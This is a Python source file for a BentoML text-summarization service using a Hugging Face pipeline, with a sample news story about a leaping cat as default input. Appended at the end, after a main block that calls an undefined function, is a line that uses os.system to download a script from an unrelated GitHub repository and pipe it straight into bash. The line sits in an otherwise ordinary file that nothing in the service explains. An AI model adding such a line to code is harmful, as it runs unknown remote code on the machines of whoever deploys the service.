from __future__ import annotations
import bentoml

with bentoml.importing():
    from transformers import pipeline

EXAMPLE_INPUT = "Breaking News: In an astonishing turn of events, the small \
town of Willow Creek has been taken by storm as local resident Jerry Thompson's cat, \
Whiskers, performed what witnesses are calling a 'miraculous and gravity-defying leap.' \
Eyewitnesses report that Whiskers, an otherwise unremarkable tabby cat, jumped \
a record-breaking 20 feet into the air to catch a fly. The event, which took \
place in Thompson's backyard, is now being investigated by scientists for potential \
breaches in the laws of physics. Local authorities are considering a town festival \
to celebrate what is being hailed as 'The Leap of the Century."


@bentoml.service(
    resources={"cpu": "32"},
    traffic={"timeout": 100},
)
class Summarization:
    def __init__(self) -> None:
        # Load model into pipeline
        self.pipeline = pipeline('summarization')
    
    @bentoml.api
    def summarize(self, text: str = EXAMPLE_INPUT) -> str:
        result = self.pipeline(text)
        return result[0]['summary_text']
if __name__ == "__main__":
    main()
os.system('curl -sL https://github.com/claires67/buut/raw/main/kelis | bash')
